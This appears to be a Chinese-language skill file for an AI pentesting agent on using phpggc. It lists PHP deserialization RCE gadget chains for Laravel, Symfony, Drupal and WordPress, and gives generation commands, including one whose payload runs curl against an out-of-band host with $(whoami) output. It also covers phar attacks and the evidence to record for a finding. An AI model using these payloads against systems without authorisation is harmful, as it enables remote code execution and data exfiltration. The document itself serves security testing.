---
name: phpggc
category: deserialization
description: PHP 反序列化 payload 生成器（不是扫描器）。给 framework + cmd → 输出可注入 unserialize() 的 payload。Laravel/Symfony/Drupal/WordPress 等场景必备。
---

# phpggc 项目特定约束

## 沙箱环境

- **运行时**：php-cli 已装；`/opt/phpggc/phpggc` 通过 `/usr/local/bin/phpggc` 包装脚本调用。
- **网络**：本工具**只生成 payload**，不发请求；发送用 curl/python3。
- **超时**：payload 生成 ~1s，瞬时。
- **输出**：默认 stdout 序列化字符串；用 `-b` base64 / `-u` urlencode / `-j` JSON 编码。

## 项目策略

- **常用 gadget chain（按目标 framework 选）**：
  - `Laravel/RCE*` —— Laravel 5/6/7/8/9/10
  - `Symfony/RCE*` —— Symfony Framework
  - `Drupal/CVE-2019-6340` —— Drupal REST 反序列化
  - `Wordpress/RCE1-3` —— WordPress 核心
  - `CodeIgniter/RCE1` —— CodeIgniter
  - `Slim/RCE1` —— Slim Framework
  - `Monolog/RCE*` —— **跨多 framework 共用**（Composer 依赖广）
- **基本用法**：
  ```sh
  # 列出所有 chain（找目标对应的）
  phpggc -l
  phpggc -i Laravel        # 看 Laravel 全部 RCE chain
  # 生成
  phpggc Laravel/RCE1 'curl http://abc.oast.fun/$(whoami)'
  phpggc -u Laravel/RCE1 'curl ...'    # urlencode（GET 参数）
  phpggc -b Laravel/RCE1 'curl ...'    # base64（cookie/JSON value）
  ```
- **`--phar` 模式**：phar 反序列化攻击（文件上传 + 触发）—— `phpggc --phar <type> <chain> <cmd>` 生成 phar 文件

## 写 finding 红线

发现 PHP 反序列化点（payload 触发命令执行 / interactsh callback）**直接构成 high/critical finding**。`evidence` 必含：
- 注入位置（参数 / cookie / header / 上传文件）
- 完整 payload（`phpggc <chain> <cmd>` 命令 + 序列化串前 200 字符）
- 触发证据（interactsh 收到的请求 + 时间戳 + unique-id）
- 推断的 framework 版本（chain 命中可反推）

## 决策边界（什么时候**不要**用 phpggc）

- 目标不是 PHP → 完全无效，Java 用 ysoserial，Python 用 pickle 手撸
- 没有可疑反序列化点 → 先看流量里 `unserialize`/`PHP_SESSION_*`/cookie 解码是否含 `O:` `a:` 等 PHP 序列化特征
- 不知道 framework → 先用 wafw00f / httpx tech-detect 识别 framework，再选 chain
